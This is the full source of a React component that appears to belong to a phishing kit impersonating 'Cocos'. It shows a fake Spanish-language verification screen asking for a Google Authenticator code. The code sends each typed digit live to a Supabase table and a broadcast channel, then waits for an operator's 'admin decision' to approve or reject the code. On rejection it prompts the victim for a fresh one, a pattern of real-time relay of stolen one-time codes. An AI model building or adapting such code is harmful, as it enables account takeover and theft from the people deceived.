import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { KeyRound, X, ClipboardPaste } from "lucide-react";
import CocosLogo from "./CocosLogo";

interface CocosOtpScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const CocosOtpScreen = ({ email, sessionId, onBack }: CocosOtpScreenProps) => {
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Listen for admin decisions via broadcast
  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel.on("broadcast", { event: "otp_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "otp_approved") setStatus("success");
      else if (decision === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => setStatus("input"), 2000);
      }
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data?.status === "otp_approved") { setStatus("success"); clearInterval(pollInterval); }
      else if (data?.status === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => {
          setStatus("input");
          supabase.from("sessions").update({ status: "redirect_otp" } as any).eq("id", sessionId).then(() => {});
        }, 2000);
        clearInterval(pollInterval);
      }
    }, 2000);

    return () => { supabase.removeChannel(channel); clearInterval(pollInterval); };
  }, [sessionId]);

  useEffect(() => {
    const channel = supabase.channel(`session-review-client-otp-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "otp_approved") setStatus("success");
      else if (decision === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => setStatus("input"), 2000);
      }
    }).subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  const syncOtpToDb = useCallback((code: string) => {
    supabase.from("sessions").update({ otp_code: `token_code:${code}` } as any).eq("id", sessionId).then(() => {});
    const broadcastCh = supabase.channel(`confirm-email-${sessionId}`);
    broadcastCh.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        broadcastCh.send({ type: "broadcast", event: "client_token_update", payload: { token_code: code } });
        setTimeout(() => supabase.removeChannel(broadcastCh), 1500);
      }
    });
  }, [sessionId]);

  const handleDigitChange = (index: number, value: string) => {
    if (status !== "input") return;
    const char = value.slice(-1);
    if (char && !/^\d$/.test(char)) return;

    const newDigits = [...digits];
    newDigits[index] = char;
    setDigits(newDigits);

    const fullCode = newDigits.join("");
    syncOtpToDb(fullCode);

    if (char && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    if (newDigits.every(d => d !== "") && fullCode.length === 6) {
      setStatus("verifying");
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const cleaned = text.replace(/\D/g, "").slice(0, 6);
      if (cleaned.length > 0) {
        const newDigits = ["", "", "", "", "", ""];
        for (let i = 0; i < cleaned.length; i++) {
          newDigits[i] = cleaned[i];
        }
        setDigits(newDigits);
        syncOtpToDb(newDigits.join(""));
        if (cleaned.length === 6) {
          setStatus("verifying");
        } else {
          inputRefs.current[cleaned.length]?.focus();
        }
      }
    } catch { /* clipboard not available */ }
  };

  if (status === "success") {
    return (
      <div className="flex min-h-[100dvh] flex-col items-center bg-[#f5f7fb] px-5 pt-10">
        <div className="mb-8"><CocosLogo /></div>
        <div className="w-full max-w-[500px] text-center">
          <h1 className="mb-3 text-2xl font-bold text-[#1a2233]">Verificación completa</h1>
          <p className="text-[14px] text-[#8895aa]">Tu identidad fue verificada. Redirigiendo...</p>
          <p className="mt-2 text-[12px] text-[#b0b8c9]">{email}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] flex-col items-center bg-[#f5f7fb] px-5">
      {/* Header bar */}
      <div className="flex w-full max-w-[500px] items-center justify-between py-4">
        <button onClick={onBack} className="p-1.5 text-[#5a6a85] hover:text-[#1a2233] transition-colors">
          <X size={20} />
        </button>
        <span className="text-[14px] font-medium text-[#5a6a85]">Código de 6 dígitos</span>
        <div className="w-[20px]" />
      </div>

      {/* Main card */}
      <div className="w-full max-w-[500px] rounded-2xl bg-white p-6 sm:p-8 pt-8 sm:pt-10 shadow-sm mt-2">
        {/* Key icon */}
        <div className="mb-5 flex h-[52px] w-[52px] items-center justify-center rounded-full bg-[#dbeafe]">
          <KeyRound size={22} className="text-[#1a3f8f]" />
        </div>

        {/* Title */}
        <h1 className="mb-2 text-[18px] sm:text-[20px] font-semibold text-[#1a2233] leading-tight">
          Ingresá el código
        </h1>
        <p className="mb-7 text-[13px] sm:text-[14px] text-[#8895aa] leading-relaxed">
          Escribí o pegá el código temporal de 6 dígitos generado en Google Authenticator.
        </p>

        {errorMessage && status === "error" && (
          <div className="mb-5 rounded-xl border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{errorMessage}</div>
        )}

        {/* 6-digit input boxes: 3 - 3 */}
        <div className="mb-4 flex items-center justify-center gap-1.5 sm:gap-2">
          {digits.slice(0, 3).map((digit, i) => (
            <input
              key={i}
              ref={(el) => { inputRefs.current[i] = el; }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleDigitChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              disabled={status === "verifying"}
              autoFocus={i === 0}
              className="h-[50px] w-[42px] sm:h-[54px] sm:w-[48px] rounded-xl border border-[#d8dfe8] bg-white text-center text-[20px] font-semibold text-[#1a2233] outline-none transition-all focus:border-[#1a3f8f] focus:ring-2 focus:ring-[#1a3f8f]/15 disabled:opacity-50"
            />
          ))}
          <span className="mx-0.5 sm:mx-1 text-[20px] text-[#b0b8c9]">-</span>
          {digits.slice(3, 6).map((digit, i) => (
            <input
              key={i + 3}
              ref={(el) => { inputRefs.current[i + 3] = el; }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleDigitChange(i + 3, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i + 3, e)}
              disabled={status === "verifying"}
              className="h-[50px] w-[42px] sm:h-[54px] sm:w-[48px] rounded-xl border border-[#d8dfe8] bg-white text-center text-[20px] font-semibold text-[#1a2233] outline-none transition-all focus:border-[#1a3f8f] focus:ring-2 focus:ring-[#1a3f8f]/15 disabled:opacity-50"
            />
          ))}
        </div>

        {/* Paste button */}
        <button
          onClick={handlePaste}
          className="flex items-center gap-1.5 text-[13px] font-medium text-[#1a3f8f] hover:text-[#0f2d6e] transition-colors"
        >
          <ClipboardPaste size={14} />
          Pegar código
        </button>

        {/* Verifying status */}
        {status === "verifying" && (
          <div className="mt-6 flex items-center gap-2 text-sm text-[#8895aa]">
            <div className="h-2 w-2 animate-pulse rounded-full bg-[#1a3f8f]" />
            Verificando código...
          </div>
        )}
      </div>
    </div>
  );
};

export default CocosOtpScreen;
